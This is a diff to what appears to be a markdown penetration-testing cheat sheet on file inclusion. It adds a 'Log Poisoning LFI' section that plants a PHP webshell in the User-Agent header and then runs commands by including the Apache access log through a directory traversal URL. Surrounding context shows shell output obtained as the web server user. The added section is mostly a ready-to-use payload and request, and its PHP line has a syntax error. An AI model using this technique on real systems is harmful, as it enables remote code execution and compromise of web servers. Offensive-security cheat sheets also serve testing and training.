@@ -439,10 +439,19 @@ $ pwd
 /usr/local/www/apache24/data
 $ id
 uid=80(www) gid=80(www) groups=80(www)
+```
+
+## Log Poisoning LFI
+```
+Intercept the GET request and edit the User-Agent with a php webshell:
+User-Agent: Mozilla/5.0 <?php echo system($_GET ['cmd']; ?>
+
+Access the webshell via lfi:
+Intercept the GET request with the vulnerable parameter injection point and access your webshell in the log:
+http://site/comets/index.php?page=../../../../../../../../var/log/apache2/access.log&cmd=ls%20-ls HTTP/1.1
 
 
 ```
-
 
 ## Traversal sequences stripped non-recursively
 ```
